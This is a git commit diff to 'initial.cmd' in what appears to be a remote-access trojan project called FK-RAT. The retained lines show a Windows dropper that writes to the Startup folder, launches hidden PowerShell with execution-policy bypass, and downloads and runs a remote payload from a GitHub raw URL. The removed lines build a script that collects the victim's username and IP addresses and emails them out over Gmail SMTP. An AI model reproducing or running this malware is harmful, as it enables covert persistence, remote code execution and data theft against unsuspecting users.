7c495c31c12f3566e284611e5c5f44c3c5e48895
Sunnickel <alexanderreiter20@gmail.com>
2023-10-30 13:29:18 +0100

    asd

--- initial.cmd
+++ initial.cmd
@@ -13,24 +13,6 @@ cd "%STARTUP%"
 @REM write payloads to startup
 powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 
 
-@REM setup smtp
-(
-    echo $uname = "example@gmail.com" 
-    echo $pword =  "pword"
-
-    echo $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress
-    echo $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias WLAN).IPAddress
-
-    echo echo "Ethernet: $ipEthernet WLan: $ipWlan" > $env:UserName.rat
-
-    echo # email process
-    echo $subject = "$env:UserName logs"
-    echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
-    echo $smtp.EnableSSL = $true
-    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
-    echo $smtp.Send($email, $email, $subject, $ip);
-) > smtp.txt
-
 @REM run payload
 powershell ./wget.cmd
 
